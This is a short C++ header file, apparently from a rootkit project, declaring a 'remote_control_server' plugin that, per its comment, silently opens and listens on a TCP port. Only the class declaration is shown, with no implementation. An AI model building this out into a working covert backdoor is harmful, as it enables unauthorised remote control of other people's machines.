//
// Created by idan on 12/30/23.
//

#ifndef ROOTKIT_REMOTE_CONTROL_SERVER_H
#define ROOTKIT_REMOTE_CONTROL_SERVER_H

#include "../../basic/basic_plugin.h"
#include "../../basic/network/tcp_port.h"

// silently opens a tcp port and listens on it
class remote_control_server : public basic_plugin {
    TCP_PORT my_port;

public:
    explicit remote_control_server(TCP_PORT myPort) : my_port(myPort) {}

    void run() override;

    void stop() override;
};


#endif //ROOTKIT_REMOTE_CONTROL_SERVER_H
